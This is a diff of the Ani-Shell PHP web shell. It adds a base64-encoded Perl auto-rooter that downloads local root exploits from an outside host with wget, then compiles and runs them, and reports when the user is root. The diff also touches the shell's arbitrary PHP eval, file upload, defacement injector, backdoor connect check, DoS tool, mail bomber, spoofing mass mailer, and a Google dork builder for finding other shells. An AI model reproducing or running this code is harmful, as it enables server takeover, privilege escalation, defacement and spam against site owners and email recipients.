+cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
+MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
+IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K
+cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0
+IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jIik7ICANCnN5c3RlbSgiY2ht
+b2QgNzc3IGMiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg
+dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh
+cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2N4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGN4
+Iik7IA0Kc3lzdGVtKCIuL2N4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAw
+dCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5j
+b20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVybGUyIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGRlcmxl
+MiIpOyANCnN5c3RlbSgiLi9kZXJsZTIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUg
+ciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
+OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9kZXJsZSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBk
+ZXJsZSIpOyANCnN5c3RlbSgiLi9kZXJsZSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg
+dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh
+cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzZ4LmMiKTsgIA0Kc3lzdGVtKCJnY2MgNnguYyAt
+byA2eGEiKTsgDQpzeXN0ZW0oIi4vNnhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1
+IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2Fy
+MTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNngiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNngi
+KTsgDQpzeXN0ZW0oIi4vNngiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0
+IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNv
+bS9DTVNfRklMRVMvZmlsZS9jYy82YiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2YiIpOyANCnN5
+c3RlbSgiLi82YiIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4
+cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19G
+SUxFUy9maWxlL2NjLzZ4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2eHgiKTsgDQpzeXN0ZW0o
+Ii4vNnh4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3
+aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
+L2ZpbGUvY2MvMjc3MDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjc3MDQiKTsgDQpzeXN0ZW0o
+Ii4vMjc3MDQiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBs
+IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklM
+RVMvZmlsZS9jYy9kZXJsZTIuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlMi5jIC1vIGRlcmxlMiIp
+OyAgDQpzeXN0ZW0oImNobW9kIDc3NyBkZXJsZTIiKTsgDQpzeXN0ZW0oIi4vZGVybGUyIik7IA0K
+c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu
+IjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVy
+bGUyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZGVybGUyIik7IA0Kc3lzdGVtKCIuL2RlcmxlMiIp
+OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
+K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
+Yy8yOC5jIik7IA0Kc3lzdGVtKCJnY2MgMjguYyAtbyAyOCIpOyANCnN5c3RlbSgiY2htb2QgNzc3
+IDI4Iik7IA0Kc3lzdGVtKCIuLzI4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yOCIp
+OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
+K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
+Yy8yNy5jIik7IA0Kc3lzdGVtKCJnY2MgMjcuYyAtbyAyNyIpOyANCnN5c3RlbSgiY2htb2QgNzc3
+IDI3Iik7IA0Kc3lzdGVtKCIuLzI3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yNyIp
+OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
+K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
+Yy9jLmMiKTsgDQpzeXN0ZW0oImdjYyBjLmMgLW8gYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMi
+KTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5
+c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
+IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jMi5j
+Iik7IA0Kc3lzdGVtKCJnY2MgYzIuYyAtbyBjMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMyIik7
+IA0Kc3lzdGVtKCIuL2MyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9jMiIpOyANCnN5
+c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
+IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8wNSIp
+OyANCnN5c3RlbSgiY2htb2QgNzc3IDA1Iik7IA0Kc3lzdGVtKCIuLzA1Iik7IA0Kc3lzdGVtKCJp
+ZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0
+ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2lza28iKTsgDQpz
+eXN0ZW0oImNobW9kIDc3NyBpc2tvIik7IA0Kc3lzdGVtKCIuL2lza28iKTsgDQpzeXN0ZW0oImlk
+Iik7DQpzeXN0ZW0oIi4vaXNrbyIpOyANCnN5c3RlbSgiaXNrbyIpOw0KcHJpbnQgIklmIHUgciBy
+MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
+MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyAN
+CnN5c3RlbSgiLi8xOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgiKTsgDQpzeXN0
+ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyAN
+CnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNyIpOyAN
+CnN5c3RlbSgiY2htb2QgNzc3IDciKTsgDQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsg
+DQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3Rv
+cCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D
+TVNfRklMRVMvZmlsZS9jYy83LTIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsgDQpzeXN0
+ZW0oIi4vNy0yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi83LTIiKTsgDQpzeXN0ZW0o
+ImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5
+c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOCIpOyANCnN5
+c3RlbSgiY2htb2QgNzc3IDgiKTsgDQpzeXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz
+eXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4
+cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
+RklMRVMvZmlsZS9jYy84YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDhhIik7IA0Kc3lzdGVtKCIu
+LzhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi84YSIpOyANCnN5c3RlbSgiaWQiKTsg
+DQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3
+Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy84YmIiKTsgDQpzeXN0ZW0o
+ImNobW9kIDc3NyA4YmIiKTsgDQpzeXN0ZW0oIi4vOGJiIik7IA0Kc3lzdGVtKCJpZCIpOyANCnBy
+aW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0ZW0oIndnZXQg
+aHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzhjYyIpOyANCnN5c3RlbSgiY2ht
+b2QgNzc3IDhjYyIpOyANCnN5c3RlbSgiLi84Y2MiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQg
+IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw
+Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3
+NyA4eCIpOyANCnN5c3RlbSgiLi84eCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vOHgi
+KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry
+bCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv
+Y2MvOSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDkiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3Rl
+bSgiaWQiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
+IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
+OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9rcmFkMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGty
+YWQyIik7IA0Kc3lzdGVtKCIuL2tyYWQyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9r
+cmFkMiAtdCAxIC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEg
+LXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZDIgLXQgMSAtcCA0Iik7IA0K
+c3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkMiAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlk
+Iik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0
+ZW0oIi4va3JhZDIgLXQgMSAtcCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFk
+MiAtdCAxIC1wIDgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
+eHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T
+X0ZJTEVTL2ZpbGUvY2Mva3JhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGtyYWQiKTsgDQpzeXN0
+ZW0oIi4va3JhZCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDIi
+KTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQgLXQgMSAtcCAzIik7IA0Kc3lzdGVt
+KCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAgNCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz
+eXN0ZW0oIi4va3JhZCAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2ty
+YWQgLXQgMSAtcCA2Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAg
+NyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDgiKTsgDQpzeXN0
+ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls
+ZS9jYy9rLXJhZDMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBrLXJhZDMiKTsgDQpzeXN0ZW0oIi4v
+ay1yYWQzIC10IDEgLXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10
+IDEgLXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNCIp
+OyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNSIpOyANCnN5c3Rl
+bSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsg
+DQpzeXN0ZW0oIi4vay1yYWQzIC10LXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4v
+ay1yYWQzIC10IC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2stcmFkMyAtYSAt
+cCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rLXJhZDMgLWEgLXAgNyIpOyANCnN5
+c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
+IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yNjgi
+KTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyNjgiKTsgDQpzeXN0ZW0oIi4vMjY4Iik7IA0KcHJpbnQg
+IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw
+Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOCIpOyANCnN5c3RlbSgiY2htb2Qg
+Nzc3IDIwMDgiKTsgDQpzeXN0ZW0oIi4vMjAwOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi
+SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7ICANCnN5c3RlbSgid2dldCBodHRw
+Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOXguYyIpOyANCnN5c3RlbSgiZ2Nj
+IDIwMDl4LmMgLW8gMjAwOXgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXgiKTsgDQpzeXN0
+ZW0oIi4vMjAwOXgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
+eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
+RklMRVMvZmlsZS9jYy8yMDA5eHgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXh4Iik7IA0K
+c3lzdGVtKCIuLzIwMDl4eCIpOyANCnN5c3RlbSgiaWQiKTsNCnN5c3RlbSgiaWQiKTsgDQpwcmlu
+dCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0
+dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yLjYuOS01NS0yMDA3LXBydjgiKTsg
+DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsgDQpzeXN0ZW0oIi4vMi42
+LjktNTUtMjAwNy1wcnY4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yLjYuOS01NS0y
+MDA3LXBydjgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2
+OCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj
+dHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls
+ZS9jYy8xOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyANCnN5c3RlbSgiLi8xOCIpOyAN
+CnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxF
+Uy9maWxlL2NjLzgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgOCIpOyANCnN5c3RlbSgiLi84Iik7
+IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ
+TEVTL2ZpbGUvY2MvZHoiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZHoiKTsgDQpzeXN0ZW0oIi4v
+ZHoiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D
+TVNfRklMRVMvZmlsZS9jYy94ODYiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgeDg2Iik7IA0Kc3lz
+dGVtKCIuL3g4NiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
+NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2xvbCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBsb2wi
+KTsgDQpzeXN0ZW0oIi4vbG9sIik7IA0Kc3lzdGVtKCJpZCIpOyANCn0=";
+
+     $fd = fopen("r00t.pl","w");
+
+            if ($fd != FALSE)
+            {
+                fwrite($fd,base64_decode($r00t));
+                $out = exec_all("perl r00t.pl;");
+            	if ($out != "")
+            	{
+			$cmd_out = exec_all("whoami");
+			if ($cmd_out != "")
+			{
+				if (strpos($cmd_out == 'root') !== false)
+					echo "<p class='alert_green'>You are ".trim(exec_all("whoami"))."</p>";
+				else
+					echo "<p class='alert_red'>You are ".trim(exec_all("whoami"))."</p>";
+			}
+			else
+			{
+				echo "<p class='alert_red'>Rooting Failed</p>";
+			}
+            	}
+	    }
+            else
+            {
+                echo "<p class='alert_red'>Permission Denied</p>";
+            }
+    ?>
+    <?php
+}
 
 // PHP evaluate
 
 else if(isset($_GET['eval']))
 {
     ?>
+    
     <form method="POST">
     <textarea name="code" class="cmd" cols="100" rows="20"><?php
     // If the comand was sent
@@ -800,7 +1220,7 @@ else if(isset($_GET['eval']))
         && $_POST['code']
     )
     {
-        // FIlter Some Chars we dont need
+        // Filter Some Chars we dont need
 
         $code = str_replace("<?php","",$_POST['code']);
         $code = str_replace("<?","",$code);
@@ -808,7 +1228,7 @@ else if(isset($_GET['eval']))
 
         // Evaluate PHP CoDE!
 
-        htmlspecialchars(eval($code));
+        echo htmlspecialchars(eval($code));
     }
     else
     {
@@ -817,6 +1237,7 @@ else if(isset($_GET['eval']))
     ?></textarea><br /><br />
     <input name="submit" value="Eval That COde! :D" class="own" type="submit" />
     </form>
+
     <?php
     
 }
@@ -842,11 +1263,11 @@ else if(isset($_GET['upload']))
             $stat = move_uploaded_file($tempName , $uploadedFilePath);
             if ($stat)
             {
-                echo "<p class='warning'>File uploaded to $uploadPath</p>";
+                echo "<p class='alert_green'>File uploaded to $uploadPath</p>";
             }
             else
             {
-                echo "<p class='warning' > :( :'( Failed to upload file to $uploadPath</p>";
+                echo "<p class='alert_red'>Failed to upload file to $uploadPath</p>";
             }
          }
     }
@@ -931,6 +1352,7 @@ else if(isset($_GET['injector']))
                     <?php
                     echo "\n";
                     $fd = fopen($dir.$file,$mode);
+		    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>"; break;
                     fwrite($fd,$message);
                 }
             }
@@ -977,7 +1399,7 @@ else if(isset($_GET['injector']))
                 
                 <tr>
                     <td colspan="2">
-                        <textarea name="message" cols="173" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
+                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                     </td>
                 </tr>
                 
@@ -1038,6 +1460,100 @@ else if(isset($_GET['md5']))
         </table>
         
         <?php
+    }
+}
+
+// Google Dork Creater
+
+else if(isset($_GET['gdork']))
+{
+    if(
+    isset($_GET['title']) ||
+    isset($_GET['text']) ||
+    isset($_GET['url']) ||
+    isset($_GET['site'])
+    )
+    {
+        $title = $_GET['title'];
+        $text = $_GET['text'];
+        $url = $_GET['url'];
+        $site = $_GET['site'];
+        
+        if($title != "")
+        {
+            $title = " intitle:\"".$title."\" ";
+        }
+        if($text != "")
+        {
+            $text = " intext:\"".$text."\" ";
+        }
+        if($url != "")
+        {
+            $url = " inurl:\"".$url."\" ";
+        }
+        if($site != "")
+        {
+            $site = " site:\"".$site."\" ";
+        }
+        
+        // Print the output now
+        ?>
+        <div align="center">
+        <form action="http://google.com" method="GET">
+            <input class="cmd" style="border: solid red 1px;" name="q" value='<?php echo $title.$text.$url.$site ?>' /><br />
+            <input type="submit" style="Padding:5px;" class="own" value='Google It! ;)' />
+        </form>
+        </div>
+        <?php
+    }
+    else 
+    {
+    ?>
+    <p align="center" style="color:red;">Note : Any one of the following options is compulsory to be filled rest can be left blank.</p>
+     <table id="margins" >
+        <tr>
+            <form method='GET'>
+                <input type="hidden" name="gdork" />
+                <tr>
+                    <td width="100" class="title">
+                        intitle
+                    </td>
+                    <td>
+                         <input class="cmd" name="title" value="Ani-Shell"/>
+                    </td>
+                </tr>
+                <tr>
+                <td class="title">
+                    intext
+                </td>
+                <td>
+                    <input class="cmd" name="text" value="lionaneesh" />
+                </td>
+                </tr>
+                <tr>
+                    <td width="100" class="title">
+                        inurl
+                    </td>
+                    <td>
+                         <input class="cmd" name="url" value="Ani-Shell.php"/>
+                    </td>
+                </tr>
+                <tr>
+                    <td width="100" class="title">
+                        site
+                    </td>
+                    <td>
+                         <input class="cmd" name="site" value="*.org"/>
+                    </td>
+                </tr>
+                <tr>
+                    <td rowspan="2" >
+                        <input style="margin : 20px; margin-left: 390px; padding : 10px;" type="submit" class="own" value="Gimme the Dork!"/>
+                    </td>
+                </tr>
+        </form>
+        </table>
+    <?php
     }
 }
 
@@ -1133,11 +1649,11 @@ else if(isset($_GET['connect']))
                 
                 if(preg_match("/$pattern/",$list))
                 {
-                        echo "<p class='warning'>Process Found Running! Backdoor Setuped Successfully! :D</p>";
+                        echo "<p class='alert_green'>Process Found Running! Backdoor Setuped Successfully! :D</p>";
                 }
                 else
                 {
-                    echo "<p class='warning'>Process Not Found Running! Backdoor Setup FAILED :(</p>";
+                    echo "<p class='alert_red'>Process Not Found Running! Backdoor Setup FAILED :(</p>";
                 }
                 
                 echo "<br /><br />\n<b>Task List :-</b> <pre>\n$list</pre>";
@@ -1469,6 +1985,7 @@ else if(isset($_GET['dos']))
     }
     else
     {
+
         ?>
         <form method="GET">
             <input type="hidden" name="dos" />
@@ -1560,13 +2077,13 @@ else if(isset($_GET['bomb']))
             if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,"From:".$from))
             {
                 $error = 1;
-                echo "<p class='alert'>Some Error Occured!</p>";
+                echo "<p class='alert_red'>Some Error Occured!</p>";
                 break;
             }
         }
         if($error != 1)
         {
-            echo "<p class='alert'>Mail(s) Sent!</p>";
+            echo "<p class='alert_green'>Mail(s) Sent!</p>";
         }
     }
     else
@@ -1615,7 +2132,7 @@ else if(isset($_GET['bomb']))
                 </tr>
                 <tr>
                     <td colspan="2">
-                        <textarea name="message" cols="173" rows="10" class="cmd">Ani-Shell Rocks!!</textarea>
+                        <textarea name="message" cols="110" rows="10" class="cmd">Ani-Shell Rocks!!</textarea>
                     </td>
                 </tr>
                 
@@ -1631,7 +2148,6 @@ else if(isset($_GET['bomb']))
     }
 }
 
-
 //Mass Mailer
 
 else if(isset($_GET['mail']))
@@ -1646,11 +2162,11 @@ else if(isset($_GET['mail']))
 
         if(mail($_GET['to'],$_GET['subject'],$_GET['message'],"From:".$_GET['from']))
         {
-            echo "<p class='alert'>Mail Sent!</p>";
+            echo "<p class='alert_green'>Mail Sent!</p>";
         }
         else
         {
-            echo "<p class='alert'>Some Error Occured!</p>";
+            echo "<p class='alert_red'>Some Error Occured!</p>";
         }
     }
     else
@@ -1689,7 +2205,7 @@ else if(isset($_GET['mail']))
                 
                 <tr>
                     <td colspan="2">
-                        <textarea name="message" cols="173" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
+                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                     </td>
                 </tr>
                 
@@ -1718,29 +2234,43 @@ else if(isset($_POST['file']) &&
     if(file_exists($_POST['file']))
     {
         $handle = fopen($_POST['file'],"w");
-        fwrite($handle,$_POST['content']);
-        echo "Your changes were Successfully Saved!";
+	if (!handle) echo "<p class='alert_red'>Permission Denied</p>";
+	else {
+        	fwrite($handle,$_POST['content']);
+        	echo "Your changes were Successfully Saved!";
+        }
     }
     else
     {
-        echo "<p class='alert'>File Name Specified does not exists!</p>";
+        echo "<p class='alert_red'>File Name Specified does not exists!</p>";
     }
 }
 
-// PHP decoder
+// PHP Obfuscator
 
-else if(isset($_GET['decode']))
+else if(isset($_GET['obfuscate']))
 {
-    $content = "";
-    if(isset($_POST['content']))
